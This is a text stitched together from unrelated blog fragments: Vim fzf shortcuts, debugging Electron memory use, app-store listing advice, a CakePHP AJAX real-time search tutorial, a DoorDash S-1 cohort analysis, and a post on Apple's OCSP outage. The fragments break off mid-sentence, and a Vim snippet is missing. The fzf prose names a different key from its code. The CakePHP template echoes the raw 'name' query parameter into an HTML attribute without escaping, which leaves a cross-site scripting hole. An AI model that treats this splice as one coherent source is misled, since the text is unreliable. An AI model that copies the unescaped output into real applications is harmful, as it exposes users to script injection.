up, so it opens with CTRL + p, you can add the following to your <code>.vimrc</code>:</p>
<div data-language="vim"><pre><code>nnoremap <span>&lt;</span>C<span>-</span><span>p</span><span>&gt;</span> <span>:</span>GFiles<span>&lt;</span>Cr<span>&gt;</span></code></pre></div>
<h2 id="speed-search-your-project"><a href="#speed-search-your-project" aria-label="speed search your project permalink"></a>Speed search your project</h2>
<p>What blows my mind from time to time is other things you can do with fzf in
Vim. For example, you can use
<a href="https://github.com/ggreer/the_silver_searcher">The Silver Searcher</a>
or
<a href="https://github.com/BurntSushi/ripgrep">ripgrep</a> with fzf.
To search with The Silver Searcher, type <code>:Ag</code> and a term you want to
search. And, to search with ripgrep, type <code>:Rg</code> and the term. Of course, to
have these commands work, you need the respective libraries installed in your
environment.</p>
<p>I use <code>:Ag</code>, and it performs wonderfully. It is wired to CTRL + g for me,
so I access it quickly. To have this or a similar setup, add the following
to your <code>.vimrc</code>:</p>

<p>The shortcut above will open up the <code>:Ag</code> search windows at the bottom with the
preview of the file. I find it super helpful and quick when I need to search
for a word in a project. Let’s see <code>:Ag</code> in action.</p>
<p><img src="https://pragmaticpineapple.com/0c1dc6a8efd411223955dd76a20783a6/ag-in-action.gif" alt=":Ag in action"></p>
<h2 id="buffed-up"><a href="#buffed-up" aria-label="buffed up permalink"></a>Buffed up</h2>
<p>You can search all your open buffers with fzf by typing <code>:Buffers</code>. I keep a
shortcut at my leader key (the Space key, BTW) + b. Like so:</p>
<div data-language="vim"><pre><code>nnoremap <span>&lt;</span><span>silent</span><span>&gt;</span><span>&lt;</span>leader<span>&gt;</span><span>l</span> <span>:</span>Buffers<span>&lt;</span>CR<span>&gt;</span></code></pre></div>
<p>With that command, you will get a buffers explorer where you can quickly switch
between open files. I hope that helps. Let’s see how it looks:</p>
<p><span>

<p>If you are a fan of drawing inside the terminal, then you are going to love this one.
Try typing <code>:Commits</code> if you are using the <a href="https://github.com/tpope/vim-fugitive">vim-fugitive</a> plugin.
The plugin by itself is a pretty awesome wrapper around Git, just if you
never want to leave the warmth of your Vim session. Anyways, if you type
<code>:Commits</code> you should get a tree of your project commits like so:</p>

<p>Pretty cool, huh? You can scroll up and down and checkout changes at each
commit. You can even enter the commit you are interested in and check out
changes made there. All of this is possible thanks to the <code>vim-fugitive</code>, so check
it out. A blog post about using Git inside Vim is coming, so be sure to

<p>Vim ecosystem has a lot of plugins, and fzf is one great plugin. You can search
for files with <code>:GFiles</code> and <code>:Files</code>. If you want to do a text search, try using
<code>:Ag</code> or <code>:Rg</code>, which use The Silver Searcher and ripgrep, respectively. Tired of
slow switching between open buffers - try out <code>:Buffers</code>. Or, if you want some
nice commit information, do <code>:Commits</code>.</p>
<p>These are just a couple of commands and tricks fzf has, be sure to check out
their README for more information. Also, stay tuned for more posts like these

<p><img src="http://seenaburns.com/assets/posts/debugging-electron-memory-usage/activity-monitor-horror.png" alt="Electron memory usage"></p>

<p>This past week I was working on an image browser I’ve been building in Electron, namely trying to
figure out why it would hold onto a bunch of memory.</p>

<p>I use this browser for reference images – high res illustrations, renders or photographs – I’ve
collected. As you navigate directories, the browser loads all the images into a mosaic tile display.
And because this is local, it’s snappy.</p>

<p><img src="http://seenaburns.com/assets/posts/debugging-electron-memory-usage/image-browser-screenshot.jpg" alt="Image Browser Screenshot"></p>

<p>The problem is, when I would throw in a search that pulls up all the images, the RSS memory shoots
up: from a 300MB steady state to ~800MB-1GB. Navigating away doesn’t flush this memory. More notable
context: this application has very little state (UI state + list of current images), the images are
the only thing of relevance.</p>

<p>The cheap answer: it’s Electron. And I gave up a few times along the way: there are many layers of
huge technologies, doing their own optimizations and, not being familiar with any of them, makes it
difficult to reason about what’s happening.</p>


<p>The first thing I did: open the developer tools and try everything!</p>

<p><a href="http://seenaburns.com/assets/posts/debugging-electron-memory-usage/composite-dev-tools-full.png">
<img src="http://seenaburns.com/assets/posts/debugging-electron-memory-usage/composite-dev-tools.png" alt="Composite Dev Tools Summary">
</a></p>

<p>Click to enlarge</p>

<p>Things I’ve learned here:</p>
<ul>
  <li><strong>Memory Patterns</strong>:
    <ul>
      <li>Memory doesn’t grow indefinitely with use - not a memory leak.</li>
      <li>The activity monitor shows the app holds onto memory, even when navigating way from
searches/directories with images.</li>
      <li>If I refresh with <code>cmd-R</code>, everything is flushed, including memory used.</li>
    </ul>
  </li>
  <li><strong>Heap</strong>:
    <ul>
      <li>The javascript heap is “only” 7MB, including what seems to be closures, compiled
code, and representations of DOM elements.</li>
      <li>Allocations shows the largest object types have barely a few megabytes</li>
      <li>Between loading a heavy directory, I see kilobytes of allocations, not megabytes</li>
    </ul>
  </li>
  <li>Layers have ~150MB? What’s up with that</li>
  <li>Site data is all empty, clearing does nothing</li>
  <li>Frames has reference to every image I’ve loaded so far?</li>
</ul>

<p>My hunch is it’s a caching issue or unreleased garbage. Navigating across pages retains the memory,
it grows as images load, but levels off. Given this is a loosely coded prototype, I’m skeptical I
haven’t been shooting myself in the foot without realizing it.</p>

<p>I spent a lot of time hunting dead ends, thinking it was me retaining references without realizing
it. For example: why don’t listeners drop when navigating away? Am I handling onclick functions
correctly? Maybe, because I’m throwing closures at every problem, I’m creating lots of compile code
junk. No luck varying my code however.</p>

<h2 id="processmemoryusage-forced-gc-globalgc">process.memoryUsage, forced gc (global.gc)</h2>
<p>Here I looked into trying to force a GC to see what was being retained.</p>

<p>This requires <code>--expose-gc</code> to be enabled, e.g. by running <code>electron --js-flags="--expose-gc"</code>, and
then I can add the following to the renderer:</p>

<div><div><pre><code><span>function</span> <span>logBytes</span><span>(</span><span>x</span><span>)</span> <span>{</span>
  <span>console</span><span>.</span><span>log</span><span>(</span><span>x</span><span>[</span><span>0</span><span>],</span> <span>x</span><span>[</span><span>1</span><span>]</span> <span>/</span> <span>(</span><span>1000.0</span><span>*</span><span>1000</span><span>),</span> <span>"MB"</span><span>)</span>
<span>}</span>

<span>function</span> <span>getMemory</span><span>()</span> <span>{</span>
  <span>Object</span><span>.</span><span>entries</span><span>(</span><span>process</span><span>.</span><span>memoryUsage</span><span>()).</span><span>map</span><span>(</span><span>logBytes</span><span>)</span>
<span>}</span>

<span>setInterval</span><span>(</span><span>getMemory</span><span>,</span> <span>1000</span><span>)</span>
</code></pre></div></div>

<p>Showing</p>

<div><div><pre><code>rss       859.414528 MB
heapTotal  13.651968 MB
heapUsed    7.385920 MB
external  142.377168 MB
</code></pre></div></div>

<p>This is another view at the JS heap really, which we yet again see is relatively tiny. Nevertheless,
I tried a periodic forced garbage collection:</p>

<div><div><pre><code><span>function</span> <span>gc</span><span>()</span> <span>{</span>
  <span>global</span><span>.</span><span>gc</span><span>()</span>
  <span>console</span><span>.</span><span>log</span><span>(</span><span>"gc"</span><span>)</span>
<span>}</span>
<span>setInterval</span><span>(</span><span>gc</span><span>,</span> <span>10000</span><span>)</span>
</code></pre></div></div>

<p>This dropped down the heap (in one attempt from 17MB to 10MB), but otherwise no effect. I think
between this, <code>process.memoryUsage()</code> and the allocations we can have a good sense the problem is
not the js heap, or unretained references.</p>

<h2 id="sessionclearcache">Session.clearCache</h2>
<p>I also found a suggestion from another user with image caching problems to use <code>clearCache</code>, which
lead me to running the following on the main process (after creating the window):</p>

<div><div><pre><code><span>let</span> <span>remote</span> <span>=</span> <span>require</span><span>(</span><span>'remote'</span><span>)</span>
<span>function</span> <span>clearCache</span><span>()</span> <span>{</span>
  <span>remote</span><span>.</span><span>getCurrentWindow</span><span>().</span><span>webContents</span><span>.</span><span>session</span><span>.</span><span>clearCache</span><span>(</span><span>function</span><span>(){</span>
    <span>console</span><span>.</span><span>log</span><span>(</span><span>"Cache Cleared"</span><span>)</span>
  <span>})</span>
<span>}</span>
<span>setInterval</span><span>(</span><span>clearCache</span><span>,</span> <span>10000</span><span>)</span>
</code></pre></div></div>

<p>Which had zero effect. Likewise using <code>session.clearStorageData()</code> had no effect.</p>

<p>Looking at the documentation for
<a href="https://electronjs.org/docs/api/session">session</a> shows it looks it is a property of
<a href="https://electronjs.org/docs/api/web-contents">WebContents</a>, which renders and controls the
webpages. Even though that seems promising, <code>session</code> “Manage browser sessions, cookies, cache,
proxy settings, etc.”, which sounds much more like the context for web requests (like login session
in cookies?), and not rendering.</p>

<p>This is confirmed by the <a href="https://github.com/electron/electron/blob/master/atom/browser/api/atom_api_session.cc">electron source for
session</a>
which points to the <a href="https://cs.chromium.org/chromium/src/net/http/http_cache.h?dr=CSs&amp;l=59">chromium source for
HttpCache</a>, where the
caching logic follows <a href="https://tools.ietf.org/html/rfc7234">RFC 7234</a>: HTTP/1.1 Request/Response
Caching.</p>

<p>I’m not totally sure this caching excludes images, but in my case, files are being read from disk,
so in retrospect, it makes sense I didn’t see a difference from calling these methods.</p>

<h2 id="external-memory">External Memory</h2>

<p>At this point, I wanted to know what was up with the 142MB of external memory from
<code>process.MemoryUsage()</code>. From the <a href="https://nodejs.org/api/process.html">nodejs documentation</a></p>

<blockquote>
  <p><strong>heapTotal</strong> and <strong>heapUsed</strong> refer to V8’s memory usage. <strong>external</strong> refers to the memory usage
of C++ objects bound to JavaScript objects managed by V8.</p>
</blockquote>

<p>Perhaps the open files, like images, were being buffered? Maybe this reference was held open because
of something in chromium, like those frames in the dev tools that had the full image.</p>

<p>I took at look at what options are available for memory under <code>node --v8-options</code>, and eventually
turned on <code>--trace_gc</code> and <code>--trace_gc_verbose</code> to get this log:</p>

<p>My impression here is <strong>used</strong> refers to currently live (not garbage), <strong>available</strong> is something
about available virtual memory address space, and <strong>committed</strong> is what has already been requested
of the address space.</p>

<p>The things that stick out to me here:</p>
<ul>
  <li>All spaces (mostly driven by old space) continues to grow (larger than my previous heap measures?)</li>
  <li>External memory jumps up and then back down</li>
</ul>

<p>Thus began the Googling. From a link I comment on a github issue (which I sadly cannot find anymore), I learned
RSS is a bad measure, allocators try not to  return memory back to the OS when possible (this makes
sense if requesting memory is so expensive). <a href="http://jayconrod.com/posts/55/a-tour-of-v8-garbage-collection">A tour of V8: Garbage
Collection</a> was helpful here. Amongst
many other things, it mentions V8 lazily sweeps:</p>

<blockquote>
  <p>All this memory doesn’t necessarily have to be freed up right away though, and delaying the
sweeping won’t really hurt anything. So rather than sweeping all pages at the same time, the
garbage collector sweeps pages on an as-needed basis until all pages have been swept.</p>
</blockquote>

<p>I resigned to believing that these images get buffered in external memory, V8 freely takes as much
memory as the OS will let it even if it is for garbage, and then even when cleaning up garbage, it
does not release requested memory back to the OS.</p>

<p><strong>Note:</strong> In hindsight, now that I know what was actually wrong, I think it’s fair to question these
very hand-wavy assumptions.</p>

<h2 id="reading-the-documentation">Reading the Documentation</h2>

<p>A few weeks passed and I came back to the problem, with this nagging feeling that I didn’t really
understand what was happening. After many failed attempts at trying to get
<a href="https://github.com/bnoordhuis/node-heapdump">node-heapdump</a> set up, I did another sweep of Googling
for similar problems, leading me to read various pages of the <a href="https://electronjs.org/docs/api">available Electron
APIs</a>:</p>

<ul>
  <li>I dug into the on-disk storage to see if there was any disk cache that was getting pulled into
memory.</li>
  <li>For a brief moment, I thought <a href="https://electronjs.org/docs/api/native-image">NativeImage</a> might be
an optimization for my use case, instead of <code>file://</code> references.</li>
  <li>I …</li></ul></div></div>

After a search request in Google Play, users see only an app icon and title for most apps; they can see screenshots only after they go to the app page. However, if your app has a strong brand, users can see the first three screenshots or a video right away. The Google Play approach to popular apps copies the way how the App Store shows all apps in search results.<br></p></div> </div></div></div></div></div><div id="rec201774210" data-record-type="106" data-bg-color="#161818"><!-- T004 --><div><div> <div><div field="text"><p>An icon is the face of your app and brand. It's important<strong> not to overload it with small details </strong>and make it easily readable on a screen of any size. Also, it's a good idea to research your competitors and pick something different from them to stand out in a search request. For example, a painful amount of pdf reader apps mimic the Adobe Acrobat colour scheme: a white object on the red background. As a result, when someone searches "pdf viewer", they see an endless list of similar red-and-white icons.<br></p></div></div></div></div></div><div id="rec201774329" data-record-type="239" data-bg-color="#161818"><!-- T210 --><div><div><div> <div> <div field="descr"><p>Use large font size and elements</p></div> </div> <div><div field="text"><div data-customstyle="yes"><p>Regarding screenshots, the main rule is similar: all elements should be big enough so a user easily understands what an app is about. Remember that an extremely tiny number of users open full-size images, I doubt they amount even to 1%. Also, you can highlight the most important UI elements.</p><p>Another vital thing is <strong>phrases</strong>. First, you should use them. As I said earlier, users don't read descriptions so title and screenshots are their main sources of information about your app. Second, it's better to tell users how your app can help them instead of listing features. And again, make your visuals differ from competitors, especially in the App Store as users see both icons and screenshots there.</p></div></div> </div></div></div></div></div><div id="rec201774678" data-record-type="106" data-bg-color="#161818"><!-- T004 --><div><div> <div><div field="text"><div data-customstyle="yes"><p>Speaking of videos, they're tricky.

Videos play automatically in the App Store by default and should be clicked on to start playing in Google Play. The video preview takes the place of a first screenshot on the app page. I'd say only a preview for Google Play requires optimization: App Store users won't likely see it anyway. </p><p>For video previews, you can follow the same recommendations as for screenshots. There's one more addition for Google Play: keep in mind that a "play" button will hide the centre of a preview.

They can be accompanied by reviews where users describe what they like or don't like about your app. </p><p> It's recommended to keep the rating at least as high as <strong>4.5</strong>. This is a multi-step and ongoing process: you need to enhance your app, build your brand and connect with users both inside and outside the app. </p><p> Unlike text and graphics, you have much less control over ratings and reviews. But it's a great channel to receive feedback: you can analyse what irritates people, gather their feature requests and — most importantly — communicate with users, answering to their reviews. In result, your app rating can increase. </p></div></div></div></div></div></div><div id="rec201775586" data-record-type="239" data-bg-color="#161818"><!-- T210 --><div><div><div> <div> <div field="descr"><p>Negative reviews aren't a catastrophe — a user can change their opinion about your app</p></div> </div> <div><div field="text"><div data-customstyle="yes"><p>Now, most companies don't answer to reviews though it's one of few opportunities to persuade a user they need to change a negative rating. You can send a user a message that a bug was fixed, a feature added, or any other reason has disappeared. If you're lucky, they'll update their review and give your app a better rating. </p><p> Of course, there's a reason why most companies prefer communicating with users through customer support. App store messages are more cumbersome than emails and messengers we're so used to: for example, it's almost impossible to receive more information from a user that reported an issue. Some ASO platforms help to work with reviews but still don't eliminate all downsides. Perhaps, we'll see a more comfortable way to communicate in both the App Store and Google Play in the future. </p><p> Also, you can reset your app rating in the App Store, uploading a new app version. This feature isn't available in Google Play —instead, their rating algorithm is skewed towards more recent reviews. To add, Google Play has tools against review bombing: TikTok suffered a huge rating flop not so long ago, and moderators cleaned a sudden increase of bad reviews in a couple of days. </p><p> But before all that, you need to get a review. The App Store has in-app native forms, and Google Play works on introducing them as well. You can also use custom or <a href="https://firebase.googleblog.com/2018/08/introducing-firebase-in-app-messaging.html"><span>3rd party in-app platforms</span></a> to make these forms fit your app design. Keep in mind that app store guidelines prohibit asking a review in exchange for some kind of reward and redirecting bad reviews to customer support instead of a store. Another way to get a review is asking for them in social networks and real life. </p></div></div> </div></div></div></div></div><div id="rec201776501" data-record-type="3" data-bg-color="#161818"><!-- T107 --><div> <div itemscope="" itemtype="http://schema.org/ImageObject"><meta itemprop="image" content="https://static.tildacdn.com/tild3932-3261-4835-a166-336264623064/image_1.png"><meta itemprop="caption" content="in-app message example"> <p><img src="https://static.tildacdn.com/tild3932-3261-4835-a166-336264623064/-/empty/image_1.png" data-original="https://static.tildacdn.com/tild3932-3261-4835-a166-336264623064/image_1.png" imgfield="img" alt="in-app message example"> </p></div> </div></div><div id="rec201776718" data-record-type="106" data-bg-color="#161818"><!-- T004 --><div><div> <div><div field="text"><div data-customstyle="yes"><p>Ratings, reviews and graphics influence inorganic downloads too: when a user clicks an ad, they land on the app page.

November 18, 2020 | https://cakephp.blog/real-time-search-with-ajax-and-cakephp/ | <a href="https://web.archive.org/web/*/https://cakephp.blog/real-time-search-with-ajax-and-cakephp/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
<div>

<p>As I type away at my 9 to 5 I get a request from an executive to create a “real-time search bar for the employees-dashboard”. A fairly typical request for a code monkey like myself and, at first glance, an easily solvable problem.</p>
<p>Several hours of caffeine fueled spaghetti code later, and several more hours cleaning said spaghetti code, I finally emerged with 2 things.</p>
<ol><li>A caffeine headache that put Freud’s cocaine hangovers to shame.</li><li>A working real-time search bar, which I will be demonstrating in the tutorial below.</li></ol>
<p>If you like your skull not to rattle with every heartbeat please do me a favor and let me show you how the wheel is made so you don’t spend any time trying to remake it. I’ll assume that already have a <a href="https://cakephp.blog/getting-started-in-cakephp/">CakePHP project running </a>and jump straight into setting up the application to <a href="https://cakephp.blog/ajax-notifications-in-cakephp/">work with AJAX</a>.</p>
<h2>Real-Time Search Setup</h2>
<p>In order for your application to accept AJAX requests, you’ll need to load the <code>RequestHandler</code> component in either your AppController or the controller you want to accept AJAX requests with.</p>
<p>AppController.php</p>
<pre><code lang="php">public function initialize()
{
    //...
    $this-&gt;loadComponent('RequestHandler');
}</code></pre>
<p>Now that our application can accept AJAX requests we’ll need to create a view cell. Baking a view cell is simple with cake’s command-line tool.</p>
<pre><code lang="bash">bin/cake bake cell Search</code></pre>
<p>This should create two files:</p>
<ol><li><code>src/View/Cell/SearchCell.php</code></li><li><code>src/Template/Cell/Search/display.ctp</code></li></ol>
<p>Now let’s create a view cell that will handle our searches.</p>
<h2>Real-Time Search View Cell</h2>
<p>Open the files we previously created in the command-line and you’ll see an empty <code>display.ctp</code> file and this:</p>
<p>SearchCell.php</p>
<pre><code lang="php">&lt;?php
namespace App\\View\\Cell;

use Cake\\View\\Cell;
use Cake\\Datasource\\Paginator;

class SearchCell extends Cell
{
    public function display()
    {
    }
}</code></pre>
<p><code>SearchCell.php</code> is a view cell. A view cell is a mini-controller that can invoke logic and render templates. Basically, a reusable controller meant for rendering views.</p>
<p>This will be the piece of logic to re-render our view every time we search. In order to make our real-time search, we may want to put some logic into it. In the display function of our view cell let’s put the following:</p>
<pre><code lang="php">//...
use Cake\\View\\Cell;
use Cake\\Datasource\\Paginator;
//...
function display($name) {				
	$this-&gt;loadModel('Employees');
  // Create a paginator
  $paginator = new Paginator();
  
  // Paginate the model
  $results = $paginator-&gt;paginate(
      $this-&gt;Employees-&gt;find('all'),
      $this-&gt;request-&gt;getQueryParams(),
       [
           'conditions' =&gt; ['Employees.name like' =&gt; $name . '%']
       ]
  );

  $paging = $paginator-&gt;getPagingParams() + (array)$this-&gt;request-&gt;getParam('paging');
  $this-&gt;request = $this-&gt;request-&gt;withParam('paging', $paging);

  $this-&gt;set('employees', $results);
}
//...</code></pre>
<p>That’s quite a big leap, let’s take a step back and look at what this actually does.</p>
<p>First we load the Employees model and create a paginator.</p>
<pre><code lang="php">$this-&gt;loadModel('Employees');
$paginator = new Paginator();</code></pre>
<p>Then we add our model to our paginator, pass the URL queries, and create a condition where we only show the employees who’s names are like the name passed into our view cell.</p>
<pre><code lang="php">$results = $paginator-&gt;paginate(
      $this-&gt;Employees-&gt;find('all'),
      $this-&gt;request-&gt;getQueryParams(),
       [
           'conditions' =&gt; ['Employees.name like' =&gt; $name . '%']
       ]
);
</code></pre>
<p>How do we actually see the view cell in action? All we have to do is create a template that displays the relevant results! In this case that’s the employee name and position.</p>
<pre><code lang="markup">&lt;table&gt;
    &lt;tr&gt;
        &lt;th&gt;Name&lt;/th&gt;
        &lt;th&gt;Position&lt;/th&gt;
    &lt;/tr&gt;
&lt;?php foreach($employees as $employee): ?&gt;
    &lt;tr&gt;
        &lt;td&gt;&lt;?= $employee-&gt;name ?&gt;&lt;/td&gt;
        &lt;td&gt;&lt;?= $employee-&gt;position ?&gt;&lt;/td&gt;
    &lt;/tr&gt;
&lt;?php endforeach; ?&gt;
&lt;/table&gt;
&lt;?= $this-&gt;element('Layouts/pagination'); ?&gt;</code></pre>
<p>Now every time we put <code>&lt;?= $this-&gt;cell('Search', [$name]); ?&gt;</code> in a view our view cell template will be rendered! For us that means every time we do an AJAX call we can update our table without messy calls, or view logic.</p>
<p>We have our view cell now let’s start searching in our main view!</p>
<h2>Real-Time Search Controller</h2>
<p>In our <code>EmployeesController.php</code>‘s index function we will need to do two things</p>
<ol><li>Handle the initial non-AJAX call.</li><li>Update the table when our AJAX search is used.</li></ol>
<p>Here’s what that looks like in full:</p>
<p>EmployeesController.php</p>
<pre><code lang="php">&lt;?php
namespace App\\Controller;

use Cake\\ORM\\Query;
use Cake\\Database\\Expression\\QueryExpression;
use Cake\\View\\CellTrait;
use Cake\\Datasource\\Paginator;

class EmployeesController extends AppController {
  use CellTrait;

  public function initialize() {
		parent::initialize();
    $this-&gt;loadComponent('Paginator');
  }

  public function index() {
		$name = $this-&gt;request-&gt;getQuery('name') ? $this-&gt;request-&gt;getQuery('name') : '';
    $query = $this-&gt;Employees
                  -&gt;find('all', [
										'conditions' =&gt; [
												'Employees.name LIKE' =&gt; '%'. $name .'%'
											]
									]);

    $employees = $this-&gt;paginate($query);

    if ($this-&gt;request-&gt;is('ajax')) {
      $name = $this-&gt;request-&gt;getQuery('name');
      $this-&gt;set(compact('name'));
			$this-&gt;render('index-search');
		}

    $this-&gt;set(compact([
      'name',
      'employees'
    ]));
  }

?&gt;</code></pre>
<p>The first part is, hopefully, easy to understand. All we’re doing is checking if there is a <code>name</code> variable in the URL, finding all employees, and paginating them. In the middle, we check to see if we are dealing with an AJAX request. If so we get the <code>name</code> variable from our URL, set it as a view variable, and render a new template. Our <code>index-search</code> template is a call to the view cell with the included <code>name</code> view variable.</p>
<p>index_search.ctp</p>
<pre><code lang="php">&lt;?= $this-&gt;cell('Search', [$name]); ?&gt;</code></pre>
<p>This allows us to quickly update the employees table with our view cell template.</p>
<p>For our <code>index.ctp</code> template file we’ll, finally, add the search bar and the AJAX call!</p>
<p>index.ctp</p>
<pre><code lang="markup">&lt;h1&gt;Employees&lt;/h1&gt;
&lt;input type="text" class="form-control" id="employee-search" placeholder="Employee name" value="&lt;?= $name ?&gt;"&gt;      
&lt;script type="text/javascript"&gt;
  $( document ).ready(function() {
    $('#employee-search').keyup(function () {
      var thisHref = '/employees?name=' + $(this).val();
      if (!thisHref) {
        return false;
      }
      $('#pagination-container').fadeTo(300, 0);

      $('#pagination-container').load(thisHref, function() {
        $(this).fadeTo(200, 1);
      });
      return false;
    });
  });
&lt;/script&gt;

&lt;div id="pagination-container" class="col-12"&gt;
  &lt;?= $this-&gt;cell('Search', [$name]); ?&gt;
&lt;/div&gt;
</code></pre>
<p>You can see that the AJAX call is simple! All we do is take the value from our search bar, call the jQuery <code>load</code> function, and add-in some fancy fade effects to make the search look nicer!</p>
<p>The jQuery <code>load</code> function takes the result from the given URL and replaces the inner HTML of the object.</p>

DoorDash defines Contribution Profit as gross profit minus sales and marketing costs, Doordash’s version of retention profit or their cut that is left over after they have spent on keeping customers. In the above graph we can see that after incurring a loss from their customers in year 1 in the 5-10% range, their customers actually produce a contribution profit in years 2, 3, 4. The big question, what is driving this? It’s an important indicator of long term success. For DoorDah it’s two things.</p><figure id="w-node-5b31e6116fee-ac95238f"><p><img alt="https___bucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com_public_images_c80a9ee0-78a1-4663-a189-48e44600e0d7_637x353.png" src="https://uploads-ssl.webflow.com/5fac0bd00b5e8b8e9995239c/5fb5181fe07b8927c6cba45a_https___bucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com_public_images_c80a9ee0-78a1-4663-a189-48e44600e0d7_637x353.png"></p></figure><p>We talked about the contribution profit being gross revenue minus sales and marketing. From the above graph we can see that after year 1, the % of sales and marketing expenses that DoorDash spends on those customer cohorts drops 50-70%. The decrease in expense improves the unit economics of each customer to the point that in years 2 and beyond as we can see in the first chart, they are now profitable operating within the core business model, that is taking other operating expenses off the table. The second factor, increased order volume over time.</p><figure id="w-node-cddc66677cd2-ac95238f"><p><img alt="gov-by-cohort" src="https://uploads-ssl.webflow.com/5fac0bd00b5e8b8e9995239c/5fb5181f3fbde031cdf33e43_gov-by-cohort.jpeg"></p></figure><p>This chart shows GOV or gross order volume grows year over year from the initial cohort year, this is DoorDash’s way of defining expansion revenue which is a key driver of solid unit economics in SaaS. Given that DoorDash earns fee’s on each transaction in their app, so as gross order volume goes up, so does their fee’s and revenue. If sales and marketing expenses drop in years 2+ and gross order volume increases this create a clear path to positive unit economics for DoorDash.</p><p>Now there are two unknowns here. DoorDash still operates at a loss, even with the cohort breakdown painting a path to positive unit economics, will other OpEX ever come into line that they can operate at a profit? TBD. But more importantly over the same period, what does customer churn look like? What does revenue retention look like for those customers that don’t increase their GOV, or is DoorDash masking the loss of GOV through customer churn by pushing expansion revenue from existing customer creating a false bottom. Eventually you will run out of ways to increase existing customer revenue and with high customer churn, you will hit a wall in terms of revenue growth and those positive contribution margins. Now that isn’t all doom and gloom for DoorDash, but if it is the case, it could limit their total potential market size which directly affects revenue and price of their shares.</p><p>Overall I have to applaud the DoorDash team on their S-1 👏. The cohort analysis is a great educational tool for founders and new startups of a financial model to build on, using sales and marketing expenses to drive customer acquisition at a loss and then through decreased expenses and expansion of revenue to have a healthy CAC payback and healthy profits from the customers life-time value. Too often recurring revenue or SaaS startups don’t take the time to look at segment or cohort &nbsp;level data which often times can uncover streams of strong unit economics and uncover strong growth opportunities.</p></div></div></div></div></div></div>]]>

In the second post, I will share best practices that will help you create a comprehensive PRD.</p><p>Without further ado, let me answer the first question:</p><p><strong>What is a product requirements document (PRD)?</strong></p><p>A PRD describes in detail the capabilities of a product or a feature.

The emphasis is on '<em>precisely define.'</em> A precise definition of scope is critical for the PRD to do its job well: communicate to the engineers what they need to build.</li><li><strong>Get a higher level of clarity by reducing ambiguity.</strong> Until the PM creates the PRD, the product scope is high level and, sometimes, ambiguous.

That might be true in a few cases.

<article itemscope="" itemtype="http://schema.org/BlogPosting">

  

  <div itemprop="articleBody">
    <p>Two days ago, macOS users experienced worrying hangs when opening applications not downloaded from the Mac App Store. Many users suspected hardware issues with their devices, but as they took to social media, they found it was a widespread problem. And it was no coincidence that it was happening so soon after the launch of macOS “Big Sur”.</p>

<p>Eventually, <a href="https://twitter.com/lapcatsoftware/status/1326990296412991489">a tweet by Jeff Johnson</a> pinpointed the underlying issue. Apple’s “OCSP Responder” service was overloaded, therefore macOS was unable to verify app developers’ cryptographic certificates.</p>

<p><img src="https://blog.cryptohack.org/assets/images/apple-tweet.png?style=centerme" alt="Jeff Johnson's tweet"></p>

<p>But why are OCSP Responders in the critical path of apps launching? This post will briefly discuss code signing, how Online Certificate Status Protocol (OCSP) works, why it’s deeply flawed, and what are some better alternatives. Unlike other posts on this incident, I want to emphasise the practical crypto aspects (at a high level) and offer a balanced perspective.</p>

<h3 id="code-signing">Code Signing</h3>

<p>On their developer portal, Apple explain <a href="https://developer.apple.com/support/code-signing/">the purpose of code signing</a>:</p>

<blockquote>
  <p>Code signing your app assures users that it is from a known source and the app hasn’t been modified since it was last signed. Before your app can integrate app services, be installed on a device, or be submitted to the App Store, it must be signed with a certificate issued by Apple.</p>
</blockquote>

<p>In other words, if developers want their apps to be trusted on macOS, they must sign them using their own certificate keypair. Keychain is used to generate a unique “Developer ID” certificate, which includes a private key for the developer to use, and a public key for distribution. After Apple have signed the Developer ID certificate, the developer can use the private key to produce cryptographic signatures on their apps as part of their release process.</p>

<p>When you run an app, its signature is verified against the public key of the developer’s certificate. Then, the certificate itself is verified, by checking that it hasn’t expired yet (certificates are typically valid for 1 year), and that it’s ultimately signed by Apple’s root certificate. There may also be intermediate certificates as part of the chain up to the root certificate. A “chain of trust” has been created, because the developer ID certificate signed an app, an intermediate certificate signed the developer ID certificate, and Apple’s root certificate signed the intermediate certificate. Any Apple device can verify this chain of trust and therefore approve an app to run.</p>

<p>This is similar to the TLS Public Key Infrastructure used on the internet. But it’s also fundamentally different since Apple has total control over its own chain of trust. Other certificate authorities are not allowed to issue valid certificates for code signing as all certificates must chain back up to Apple.</p>

<p>If the verification process wasn’t successful, then users will see a scary dialogue which is difficult to bypass:</p>

<p><img src="https://blog.cryptohack.org/assets/images/apple-failed-verify.png?style=centerme" alt="Apple failed to verify popup"></p>

<h3 id="revocation">Revocation</h3>

<p>What happens when a developer is found to be breaching Apple’s rules, or loses control of their private key? A certificate authority needs to be able to instantly nullify bad certificates they’ve issued. If a certificate is being used maliciously, it’s not acceptable to wait days or months until it expires naturally, otherwise a leak of a high-profile private key would render the whole system useless.</p>

<p>This is where certificate revocation comes in. It’s an additional step in the signature verification process, which involves finding out from the certificate authority if a certificate is still valid.</p>

<p>Originally, at least on the web, this was done the simplest way you can imagine. The certificate authority would give you a Certificate Revocation List (CRL), containing serial numbers of all revoked certificates, and you could check the certificate you are currently verifying is not on the list. However, this approach stopped being used by web browsers since the list got longer and longer and failed to scale. Especially after terrifying exploits like <a href="https://en.wikipedia.org/wiki/Heartbleed">Heartbleed</a> demanded mass revocation of certificates.</p>

<p>Online Certificate Status Protocol (OCSP) is an alternative allowing real-time checking of certificates. Each certificate can include a baked-in “OCSP Responder”, a URL that you can query that will report whether the certificate has been revoked. In Apple’s case, that’s “ocsp.apple.com”. So now, in addition to verifying the cryptographic validity of the signature, each time you launch an app you’re performing a real-time check with Apple (subject to some caching) to ensure they still think the developer’s ID certificate is legitimate.</p>

<h3 id="ocsps-availability-problem">OCSP’s Availability Problem</h3>

<p>There’s a huge problem with OCSP: it makes an external service a single point of failure. What happens if the OCSP Responder is down or unreachable? Do we just refuse to verify the certificate (hard-fail)? Or do we pretend that the check was successful (soft-fail)?</p>

<p>Apple are forced to use the soft-fail behaviour, otherwise apps wouldn’t work when you’re offline. As it happens, all major browsers also implement the soft-fail behaviour, since OCSP Responders have traditionally been unreliable, and browsers want to keep displaying websites even if certificate authorities’ responders are temporarily down.</p>

